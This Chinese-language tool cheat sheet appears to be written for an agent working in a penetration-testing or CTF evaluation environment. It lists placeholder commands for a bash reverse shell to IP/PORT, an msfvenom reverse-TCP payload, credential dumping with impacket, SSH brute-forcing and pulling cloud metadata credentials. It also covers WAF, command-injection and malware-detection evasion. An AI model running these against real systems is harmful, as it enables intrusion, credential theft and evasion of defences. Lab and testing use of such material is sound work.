# 可用工具手册（按 6 大评测维度）——需要工具时先看这里，查参数用 man/--help

## 一、Web 漏洞挖掘
- `ffuf -u http://TARGET/FUZZ -w <词表> -mc 200,301 -t 50` 目录/参数爆破
- `gobuster dir -u http://TARGET -w <词表> -x php,html,txt` 目录爆破
- `sqlmap -u "http://TARGET/page?id=1" --batch --level 2` SQL 注入自动利用
- `nikto -h http://TARGET` Web 服务器扫描
- `curl -s -i -X POST http://TARGET/login -d 'user=a&pass=b'` 手工测试
- XSS: 反射点测 `<script>` / 编码变体；存储型找回显点
- 源码泄露: `/.git/`, `/backup.zip`, `robots.txt`, 注释里的 API/参数
- SSRF/XXE/反序列化/上传: 见 /opt/PayloadsAllTheThings/

## 二、二进制漏洞挖掘 / 逆向
- `file <bin>` 类型 | `strings <bin> | grep -i flag` 快速线索
- `objdump -d <bin>` 反汇编 | `objdump -h` 段表
- `readelf -a <bin>` ELF 结构/符号/动态依赖
- `gdb -q ./<bin>` 动态调试（`break *0xADDR` / `x/20gx` / `info registers`）
- `checksec --file=<bin>` 防护（NX/ASLR/PIE/RELRO）
- python: `from pwn import *` pwntools（`ELF()`, `p64()`, `cyclic()`, `ROP()`, `shellcraft`）
- python: `from capstone import *` 反汇编引擎 | `from z3 import *` 约束求解 | `ropper --file=<bin> --search "pop rdi"`

## 三、漏洞利用
- `searchsploit <服务名/版本>` 查已知 exploit
- `pwntools` 写 exp（`process()`, `remote(host,port)`, `send/recv`）
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f elf` 生成 shellcode
- 反弹 shell: `nc -lvnp <port>` 监听；`bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`
- 栈溢出: `cyclic 200` + `cyclic -l <pattern>` 找偏移 → `ROP()` 链
- 格式化串: `%p %s %n` 泄露/写

## 四、多阶段渗透 / 内网
- `nmap -sV --top-ports 1000 -T4 TARGET` 端口扫描（别用 -p- 全量，太慢）
- `nc -zvn IP port` 快速测端口
- 反弹/代理: `chisel client IP:port R:socks` 起 socks 代理
- `proxychains nmap ...` 走代理
- 横向: `impacket-psexec 'user:pass@IP'` / `impacket-wmiexec` / `impacket-secretsdump`
- 密码爆破: `hydra -l admin -P <pass.txt> ssh://IP` / `http-post-form`
- 凭据/哈希: `impacket-secretsdump`、`netexec smb IP -u user -p pass`
- 域渗透: `netexec` (smb/ldap/winrm)、`responder`（若装了）

## 五、云攻击（AWS/Azure/云原生）
- `cloudfox` 枚举云资产（若装了）
- `aws` CLI: `aws s3 ls` / `aws s3api get-bucket-acl --bucket X`（S3 权限）
- `aws ec2 describe-instances` / `aws iam list-users`
- 元数据 SSRF: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- 云函数/Serverless: 找环境变量/权限配置
- OSS/COS: `ossutil` / `az storage blob list`（若装了）

## 六、对抗规避 / WAF / YARA
- WAF 绕过: 编码（%00/%0a/%2e）、Unicode、分块传输、Content-Encoding: gzip、参数污染、大小写、反斜杠插值
- `yara`（若装了）: 写规则测试规避
- 恶意样本规避: 编码/加壳/混淆 shellcode
- 上传绕过: 扩展名/Content-Type/双写/.htaccess
- 命令注入绕过: 空白符、`$IFS`、反引号、`$(...)`、变量拼接

## 通用
- 需要现成 payload → `grep -rl "关键词" /opt/PayloadsAllTheThings/`
- 不确定工具参数 → `工具名 --help` / `man 工具名`
- 长扫描放后台: `nohup cmd > /tmp/x.log 2>&1 &` 然后 `cat /tmp/x.log`
